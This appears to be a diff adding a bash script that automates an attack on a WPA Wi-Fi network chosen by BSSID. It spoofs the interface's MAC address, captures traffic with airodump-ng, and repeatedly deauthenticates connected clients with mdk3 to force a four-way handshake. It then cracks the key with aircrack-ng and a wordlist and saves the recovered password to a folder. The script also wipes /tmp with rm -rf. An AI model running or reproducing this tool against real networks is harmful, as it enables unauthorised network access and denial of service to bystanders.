@@ -1,0 +1,445 @@
+#!/usr/bin/env bash
+#
+#
+#
+############ < Colors > ############
+#                                  #
+# Regular Colors 		   #
+Black='\e[0;30m'        # Black    #
+Red='\e[0;31m'          # Red      #
+Green='\e[0;32m'        # Green    #
+Yellow='\e[0;33m'       # Yellow   #
+Blue='\e[0;34m'         # Blue     #
+Purple='\e[0;35m'       # Purple   #
+Cyan='\e[0;36m'         # Cyan     #
+White='\e[0;37m'        # White    #
+#                                  #
+####################################                                  
+#
+#
+#
+#
+#
+#
+trap 'Mana_Mode' EXIT
+Mdk3()
+{
+	trap 'Exit' EXIT
+	if (ls /root/Handshake | grep -q "Hand-01.csv")
+	then
+		Client_Mac1=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==2{print $1}' | cut -d ',' -f 1)
+		Client_Mac2=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==3{print $1}' | cut -d ',' -f 1)
+		Client_Mac3=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==4{print $1}' | cut -d ',' -f 1)
+		Client_Mac4=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==5{print $1}' | cut -d ',' -f 1)
+		Clients=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk '{print $1}' | cut -d ',' -f 1)
+
+		
+		touch /root/Handshake/blacklist
+		Blist=(/root/Handshake/blacklist)
+
+		if [[  -n  "$Client_Mac1" ]]
+		then  
+			Running=1	
+			if !( cat $Blist | grep $Client_Mac1)
+			then
+				echo -e "$Client_Mac1">> /root/Handshake/blacklist ;clear
+			fi
+			clear; echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${Red} $Client_Mac1 \n\n"; sleep 2; clear
+				
+			for ((i=0; i<=10; i++))
+			do
+				sudo xterm -g  66x5+1+900 -fg red -T  "DeAuth: $Client_Mac1" -e "sudo mdk3 $Interface d -b /root/Handshake/blacklist -c $Channel  " &
+			done 
+
+		else
+
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Red} No Clients Available On: ${Yellow}$Essid${NC}"; sleep 3; clear
+			echo -ne "${Yellow}[${Red}+${Yellow}] ${Red} Re-Scanning: ${Blue}$Bssid${NC}"; sleep 3;clear
+			 Running=0&&Monitor
+		fi
+		
+		if [[ -n  $Client_Mac2 ]]
+		then
+			if !( cat $Blist | grep $Client_Mac2)
+			then
+				echo -e "$Client_Mac2">> /root/Handshake/blacklist ;clear
+			fi
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${Red} $Client_Mac2 \n\n"; sleep 2;clear
+			for ((w=0; w<=10; w++))
+			do
+				sudo xterm -g 94x5+400+900  -fg blue -T  "DeAuth: $Client_Mac2" -e "sudo mdk3 $Interface d -b /root/Handshake/blacklist -c $Channel  " &
+			done; 
+		fi
+	
+		if [[ -n  $Client_Mac3 ]]
+		then
+			if !( cat $Blist | grep $Client_Mac3)
+			then
+				echo -e "$Client_Mac3">> /root/Handshake/blacklist ;clear
+			fi
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac3 \n\n"; sleep 2;clear
+			for ((x=0; x<=10; x++))
+			do
+			
+				sudo xterm -g 66x5-1+900  -fg orange -T  "DeAuth: $Client_Mac3" -e "sudo mdk3 $Interface d -b /root/Handshake/blacklist -c $Channel  " &
+			done
+		fi
+
+
+		if [[ -n $Client_Mac1  && -n $Client_Mac2 && -n $Client_Mac3 ]]
+		then
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
+			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 \n\n";
+			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac3 \n\n";
+		elif [[ -n $Client_Mac1 && -n $Client_Mac2 ]]
+		then
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
+			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 \n\n";
+		elif [[ -n $Client_Mac1 ]]
+		then
+			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
+		fi
+	sleep 30;clear;for ((kill=0;kill<=5;kill++));do killall mdk3 &>/dev/null ;done; 
+	HandS=$(aircrack-ng /root/Handshake/Hand-01.cap | grep -o "1 handshake")
+	if [[ -n $HandS ]]
+	then
+		killall airodump-ng &>/dev/null 
+		rm -rf  /tmp/*  &>/dev/null 
+		Aircrack
+	else
+		 Monitor 
+	fi
+
+	fi
+}
+Aircrack()
+{
+	trap 'Exit' EXIT
+	Mana_Mode; clear; echo -ne "${Yellow}[${Red}+${Yellow}] ${Green}Four-Way HandShake Found"; sleep 3
+	Essid=$(cat  /root/Handshake/Hand-01.csv   | grep $Bssid | awk 'NR==1{print $18}' | cut -d ',' -f 1)
+	killall xterm &>/dev/null
+	Pid=$(ps -cax | grep aircrack-ng | awk '{print $1}')
+	 nohup sudo aircrack-ng -b $Bssid /root/Handshake/Hand-01.cap -w $Wordlist  2>&1 | tee -i > /root/Handshake/Key.txt  &
+	disown $Pid
+ 
+	 sudo xterm  -geometry 100x30-900+900  -T "[+] Cracking $Essid's Encryption " -e "tail -f /root/Handshake/Key.txt "& 
+
+
+	
+clear;
+sleep 3
+while :
+do
+	trap 'Exit' EXIT
+	clear; echo -ne "${Yellow}[${Red}+${Yellow}] ${Blue}Cracking ${Red}$Essid's${Blue} Encryption"; sleep 0.7
+	if !(ps cax | grep -q aircrack-ng)
+	then	
+		Passkey=$(cat /root/Handshake/Key.txt | grep "KEY FOUND!"  |  awk 'NR==1{print $4}')
+		if [[ -n $Passkey ]]
+		then
+			Exist1=$(ls /root/Desktop | grep Cracked)
+			if [[ -z $Exist1 ]]
+			then
+				sudo mkdir /root/Desktop/Cracked
+			fi
+			Essid_Folder=$(ls /root/Desktop/Cracked | grep "$Essid")
+			if [[ -z $Essid_Folder ]]
+			then
+				sudo mkdir /root/Desktop/Cracked/"$Essid"
+			fi
+			Exist2=$(ls /root/Desktop/Cracked/"$Essid" | grep  "$Essid")
+			if [[ -z $Esist2 ]]
+			then
+				sudo touch /root/Desktop/Cracked/"$Essid"/"$Essid"
+			fi
+			Exist3=$(cat /root/Desktop/Cracked/"$Essid"/"$Essid" | grep  "$Passkey")
+
+			if [[ -z $Exist3  ]]
+			then
+				if !(ls /root/Desktop/Cracked/"$Essid" | grep -q "$Essid".cap)
+				then
+					 mv /root/Handshake/Hand-01.cap  /root/Desktop/Cracked/"$Essid"/"$Essid".cap
+				fi
+				sudo echo -e "Essid: $Essid\n\nPassword: $Passkey" > /root/Desktop/Cracked/"$Essid"/"$Essid"
+			fi
+		else
+			if !(ls /root/Desktop | grep -q "Cracked")
+			then
+				mkdir /root/Desktop/Cracked 
+			fi
+	                if !(ls /root/Desktop/Cracked | grep -q "$Essid")
+			then
+				mkdir /root/Desktop/Cracked/"$Essid"
+			fi
+			if !(ls /root/Desktop/Cracked/"$Essid" | grep -q "$Essid".cap)
+			then
+				mv /root/Handshake/Hand-01.cap  /root/Desktop/Cracked/"$Essid"/"$Essid".cap	
+			fi
+		fi
+		
+	break; 
+	fi
+done; 
+killall aircrack-ng &>/dev/null
+killall term &>/dev/null
+Exit
+for ((i=0;i<=3;i++))
+do
+	
+	Mana_Mode; rm -rf /roo/Handshake
+	
+
+	if [[ $i == 3 ]]
+	then
+		echo -e "${Yellow}[${Red}+${Yellow}] ${Red}All Done"
+	fi
+done
+
+	 
+}
+HandShake()
+{
+	trap 'Exit' EXIT
+	HandS=$(aircrack-ng /root/Handshake/Hand-01.cap | grep -o "1 handshake")
+	
+	if [[ -n $HandS ]]
+	then
+		killall airodump-ng &>/dev/null 
+		rm -rf  /tmp/*  &>/dev/null 
+		Aircrack
+	else
+		Mdk3 
+	fi
+		
+}
+Running=0
+Monitor()
+{
+	trap 'Exit' EXIT 
+	if [[  $Running == 0 ]]
+	then
+		killall airodump-ng &>/dev/null
+		rm -rf /root/Handshake/Hand*  &>/dev/null
+	fi
+	if !( ls /root  | grep -q Handshake )
+	then
+		mkdir /root/Handshake
+	fi 
+	clear;echo -ne  "${Yellow}[${Red}+${Yellow}] Monitoring: ${Red}$Bssid${NC}"; sleep 0.7
+	
+	if [[ $Running == 0 ]]
+	then
+		clear;echo -ne  "${Yellow}[${Red}+${Yellow}] Monitoring: ${Red}$Bssid"; sleep 0.7 
+		xterm -fg Green -g  77x15+1900-700 -T "Monitoring: $Bssid" -e "airodump-ng --bssid $Bssid -c $Channel -w /root/Handshake/Hand --output-format csv,cap --ig $Interface " & 
+
+	fi
+			
+	sleep 30 && HandShake	
+		
+	
+}
+#
+#
+#
+Mon_Mode()
+{
+trap 'Exit' EXIT	
+ifconfig $Interface down &> /dev/null && iwconfig $Interface mode monitor  &>/dev/null && for ((i=0;i<=10;i++)); do macchanger -r $Interface &>/dev/null; done && ifconfig $Interface up &>/dev/null;service network-manager stop && Monitor
+}
+#
+#
+#
+Check()
+{
+	trap 'Exit' EXIT
+	if !(whoami | grep -q root)
+	then
+		clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}Please Run As Root";exit	
+	fi
+	if [[ -z $Wordlist  ]]
+	then
+		clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}Please Enter Your Wordlist Name";exit
+	else
+		if [[ -f $Wordlist ]]
+		then	
+			rm -rf /root/Hanshake   &>/dev/null
+			rm /tmp/* 	        &>/dev/null
+			killall airodump-ng     &>/dev/null
+			rm nohup.out	        &>/dev/null
+			killall aircrack-ng     &>/dev/null
+			rm /tmp/*               &>/dev/null
+			ifconfig $Interface up  &> /dev/null
+			Current=$(ifconfig | grep -o "$Interface")
+			if [[ -z $Current ]]
+			then
+				 clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}Interface ${Red}$Interface not ${Blue} Found";exit
+			else
+				if [[ $Channel -le 11 ]]
+				then
+					if (echo "$Bssid" | grep -o ":" | wc -l | grep -q 5 )
+					then
+						BssidL=$( echo "$Bssid" | sed "s/://g")
+						if [[ ${#BssidL} -eq 12 ]]
+						then
+							Mon_Mode
+						else
+							clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}The Bssid ${Red}$Bssid ${Blue} Doesn't Seem Correct";exit	
+						fi
+					else
+						clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}The Bssid ${Red}$Bssid ${Blue} Doesn't Seem Correct";exit
+					fi
+				else
+					clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}The Channel ${Red}$Channel ${Blue}Doesn't Seem Correct";exit
+				fi
+			fi
+		else	
+			clear; echo -e "${Yellow}[${Red}+${Yellow}] ${Blue}The Wordlist ${Red}$Wordlist ${Blue}Does not Exist";exit
+		fi
+	fi
+	
+}
+Exit()
+{
+	Mana_Mode
+	killall mkd3                         &>/dev/null 
+	ifconfig $Interface down             &>/dev/null 
+	iwconfig $Interface mode managed     &>/dev/null 
+	macchanger -p $Interface             &>/dev/null
+	ifconfig $Interface up               &>/dev/null 
+	service network-manager restart      &>/dev/null
+	rm -rf /root/Handshake               &>/dev/null
+	killall aircrack-ng                  &>/dev/null
+	rm /tmp/*                            &>/dev/null
+	rm nohup.out			     &>/dev/null
+	clear;echo  "[+] All Done";exit
+}
+Mana_Mode()
+{
+	killall mkd3                         &>/dev/null 
+	ifconfig $Interface down             &>/dev/null 
+	iwconfig $Interface mode managed     &>/dev/null 
+	macchanger -p $Interface             &>/dev/null
+	ifconfig $Interface up               &>/dev/null 
+	service network-manager restart      &>/dev/null
+	#rm -rf /root/Handshake               &>/dev/null	
+}
+#
+#
+#
+Help()
+{
+trap 'Exit' EXIT
+echo -e "
+${Yellow}Usage: ${Red} $0  ${Blue}-b 00:11:22:33:44:55 ${Green}-c 6 ${Cyan}-w Wordlist ${Yellow}-i wlan0 
+
+
+${Red}-h	Help
+
+${Blue}-b	Bssid
+
+${Green}-c	Channel
+
+${Yellow}-i 	Interface
+
+${Cyan}-w       Wordlist
+
+";exit
+}
+
+
+##################################
+
+if [[ $1 == -h ]]
+then
+	clear;Help
+elif [[ $1 == -b ]]
+then
+	Bssid=$2 
+	
+elif [[ $1 == -c ]]
+then
+	Channel=$2
+
+elif [[ $1 == -i ]]
+then
+	Interface=$2
+elif [[ $1 == -w ]]
+then
+	Wordlist=$2
+fi
+#################################
+if [[ $3 == -h ]]
+then
+	clear;Help
+elif [[ $3 == -b ]]
+then
+	Bssid=$4
+	
+elif [[ $3 == -c ]]
+then
+	Channel=$4
+
+elif [[ $3 == -i ]]
+then
+	Interface=$4
+elif [[ $3 == -w ]]
+then
+	Wordlist=$4
+fi
+##################################
+if [[ $5 == -h ]]
+then
+	clear;Help
+elif [[ $5 == -b ]]
+then
+	Bssid=$6
+	
+elif [[ $5 == -c ]]
+then
+	Channel=$6
+
+elif [[ $5 == -i ]]
+then
+	Interface=$6
+elif [[ $5 == -w ]]
+then
+	Wordlist=$6
+fi
+##################################
+if [[ $7 == -h ]]
+then
+	clear;Help
+elif [[ $7 == -b ]]
+then
+	Bssid=$8
+	
+elif [[ $7 == -c ]]
+then
+	Channel=$8
+
+elif [[ $7 == -i ]]
+then
+	Interface=$8
+elif [[ $7 == -w ]]
+then
+	Wordlist=$8
+fi
+##################################
+
+
+if [[ $1 != "-h" && $2 != "-h" && $3 != "-h" && $4 != "-h" && $5 != "-h" && $6 != "-h" && $7 != "-h" && $8 != "-h" ]]
+then
+	if [[ $1 == ""&&$2 == ""&&$3 == "" &&$4 == ""&&$5 == ""&&$6 == ""&&$7 == ""&&$8 == "" ]]
+	then
+		clear;Help
+	else
+		Check
+	fi
+	
+else
+	clear; Help
+fi
+
+
+
+
